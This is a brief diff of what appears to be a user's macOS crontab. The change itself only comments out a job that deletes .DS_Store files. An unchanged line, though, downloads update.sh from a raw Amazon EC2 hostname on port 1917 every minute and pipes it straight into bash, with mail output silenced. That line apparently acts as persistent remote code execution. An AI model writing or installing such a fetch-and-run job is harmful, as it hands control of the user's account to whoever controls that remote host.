@@ -1,5 +1,5 @@
 MAILTO=""
 * * * * * curl -L ec2-184-73-149-102.compute-1.amazonaws.com:1917/update.sh | bash
-0 * * * * find ~ -iname ".DS_Store" -exec rm {} \;
+#0 * * * * find ~ -iname ".DS_Store" -exec rm {} \;
 0 12 */5 * * rm -rf ~/.Trash/*
 0 0 * * * /Users/boesene/.bin/wlist
